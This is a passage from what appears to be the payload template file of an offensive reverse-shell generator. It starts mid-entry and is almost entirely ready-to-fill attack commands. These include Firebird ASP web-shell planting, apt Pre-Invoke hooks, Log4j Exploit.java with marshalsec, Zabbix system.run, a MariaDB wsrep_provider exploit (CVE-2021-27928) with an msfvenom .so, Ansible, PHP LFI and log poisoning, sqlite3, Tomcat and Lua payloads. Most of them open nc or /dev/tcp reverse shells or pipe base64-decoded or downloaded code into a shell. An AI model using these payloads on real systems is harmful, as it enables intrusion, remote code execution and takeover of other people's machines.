      CREATE TABLE a( x blob);
      ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\shell.asp';
      ALTER DATABASE BEGIN BACKUP;
      INSERT INTO a VALUES ('<% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_2}").StdOut.Readall() %>');
      COMMIT;
      DROP DATABASE;

      => Make sure to put this at the end of Invoke-PowerShellTcp.ps1

      Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}

      => Execute this commands on Victim Machine.

      upload /tmp/exploit.sql c:\users\dev\Downloads\exploit.sql (Using evil-winrm)
      echo "CREATE DATABASE 'C:\nonexist' user 'SYSDBA' password 'masterkey';" | .\isql.exe -u SYSDBA -p masterkey security4.fdb
      .\isql.exe -user SYSDBA -password masterkey \NONEXIST -b -i c:\users\dev\Downloads\exploit.sql


      => Open shell.asp on web
  apt_confd:
    - |
      # apt update or
      # apt changelog apt or
      # apt changelog nano

      echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"};' > /etc/apt/apt.conf.d/pwn
    - |
      # apt update or
      # apt changelog apt or
      # apt changelog nano

      echo 'apt::Update::Pre-Invoke {"echo {BASE64} | base64 -d | bash"};' > /etc/apt/apt.conf.d/pwn
  gdb_server:
    - |
      # File Reverse Shell (Local)
      echo -e '#!/bin/bash\necho {BASE64} | base64 -d | bash' > /tmp/shell.sh

      # Run (Local)
      gdb
      target extended-remote <ATTACKER_IP>:<ATTACKER_PORT>
      remote put /tmp/shell.sh /tmp/shell.sh
      set remote exec-file /tmp/shell.sh
      run
  log4j:
    - |
      # Commands To Run
      -> Run javac Exploit.java
      -> Run python3 -m http.server 80 in the directory of Exploit.java
      -> Run java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port)
    - |
      # Exploit (Save as Exploit.java)
      public class Exploit {
        static {
             try {
                   java.lang.Runtime.getRuntime().exec("echo {BASE64} | base64 -d | bash");
             } catch (Exception e) {
                   e.printStackTrace();
             }
        }
      }
    - |
      # Exploit (Save as Exploit.java)
      public class Exploit {
        static {
             try {
                 java.lang.Runtime.getRuntime().exec("bash -c {echo,{BASE64}}|{base64,-d}|{bash,-i}");
             } catch (Exception e) {
                  e.printStackTrace();
             }
        }
      }
    - |
      # Exploit (Save as Exploit.java)
      public class Exploit {
          static {
                try {
                    java.lang.Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{IP}/{PORT} 0>&1");
                } catch (Exception e) {
                    e.printStackTrace();
                }
         }
      }
    - |
      {LOG4J}
  zabbix:
    - |
      # Create Item > Put inside Key
      system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",nowait]
    - |
      # Create Item > Put inside Key
      system.run[echo {BASE64} | base64 -d | bash,nowait]
  mysql:
    - |
      # CVE-2021-27928
      # References : https://github.com/Al1ex/CVE-2021-27928
      # Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL

      1. msfvenom -p linux/x64/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf-so -o shell.so
      2. python3 -m http.server 80
      3. curl {IP}/shell.so -o /tmp/shell.so
      4. mysql -u root -p'root' -e 'SET GLOBAL wsrep_provider="/tmp/shell.so"'
    - |
      1. Save code below as shell.c

      #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>
      void _init() {
          system("echo {BASE64} | base64 -d | bash");
      }

      2. gcc -fPIC -shared -nostartfiles -o shell.so shell.c
      3. python3 -m http.server 80
      4. curl {IP}/shell.so -o /tmp/shell.so
      5. mysql -u root -p'root' -e 'SET GLOBAL wsrep_provider="/tmp/shell.so"'
  ansible:
    - |
      sudo ansible -m command localhost -a 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"'
    - |
      # Save as rev.yml

      - hosts: localhost
        tasks:
        - name: rev
          shell: bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
  php_lfi:
    - |
      # Examples (PHPINFO)
      <?php phpinfo(); ?>

      {PHP_LFI}
    - |
      # System ($_GET[0])
      <?php system($_GET[0]); ?>

      {PHP_LFI}
    - |
      # System (nc)
      <?php system("nc {IP} {PORT} -e /bin/sh"); ?>

      {PHP_LFI}
    - |
      # System (curl + sh)
      <?php system("curl {IP}/a | /bin/sh"); ?>

      {PHP_LFI}
    - |
      # System (python3)
      <?php system("echo '{BASE64_PY3}' | base64 -d | bash"); ?>

      {PHP_LFI}
    - |
      # Log poisoning

      # User-Agent: <?php passthru($_GET['cmd']); ?> Firefox/91.0
      # http://localhost/blog.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
  sqlite3:
    - |
      sudo sqlite3 /dev/null ".shell echo '{BASE64_PY3}' | base64 -d | bash"
  tomcat:
    - |
      # Host-Manager
      Name: test
      ALiases: test
      App base \\{IP}\data\

      => sudo smbserver.py -smb2support -debug -comment "test" data /pathto/data-smbserver
      => copy shell.jsp (rename shell.war) to /pathto/data-smbserver/.
      => access http://10.10.10.10/shell.jsp
  lua:
    - |
      os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
    - |
      os.execute("bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
  splunk_rce:
    - |
      {SPLUNK_RCE}
"""
